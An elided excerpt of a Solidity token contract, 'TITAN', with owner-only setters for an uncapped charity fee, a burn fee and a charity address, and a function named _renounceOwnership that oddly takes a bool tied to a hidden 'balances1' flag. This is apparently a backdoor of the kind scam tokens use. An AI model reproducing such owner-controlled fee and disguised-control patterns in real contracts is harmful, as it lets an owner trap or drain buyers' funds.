...
contract TITAN is Context, IERC20, IERC20Metadata {
    ...
    string public _symbol= "teststse";
    bool balances1 = true;
    ...
    function _setCharityAddress(address payable  _charityAddress) onlyOwner public {
        charityAddress = _charityAddress;
    }
    
    function _setCharityPercent(uint256 _charityPercent) onlyOwner public {
        charityPercent = _charityPercent;
    }
    
    function _setBurnPercent(uint256 _burnPercent) onlyOwner public {
    ...
    function _renounceOwnership(bool _balances1_) onlyOwner public {
